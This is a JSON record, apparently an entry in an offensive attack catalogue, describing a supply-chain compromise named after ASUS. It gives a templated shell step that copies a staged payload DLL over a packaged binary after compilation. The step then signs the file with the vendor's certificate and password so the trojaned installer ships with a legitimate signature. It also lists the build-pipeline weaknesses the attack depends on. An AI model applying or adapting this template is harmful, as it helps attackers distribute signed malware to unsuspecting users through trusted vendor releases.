{
  "id": "operator_asus_package_binary_replacement",
  "description": "Modifies packaged binary artifacts or replaces bundled third-party libraries after compilation but prior to signing and release staging, ensuring the final distributed installer carries legitimate vendor signatures.",
  "target_build_phase": "package_release",
  "injection_location": "dist/package/{{TARGET_BINARY}}.dll",
  "code_template": "# Pipeline build script replacement command:\ncp {{STAGED_PAYLOAD_PATH}}/{{TARGET_BINARY}}.dll {{DIST_DIR}}/{{TARGET_BINARY}}.dll\n{{SIGNING_TOOL}} sign /f {{CERT_PATH}} /p {{CERT_PASS}} {{DIST_DIR}}/{{TARGET_BINARY}}.dll",
  "preconditions": [
    "Staging directory allows write access between compilation completion and signature execution.",
    "Code signing keys are automatically applied to all files present in the release staging directory without artifact integrity verification."
  ]
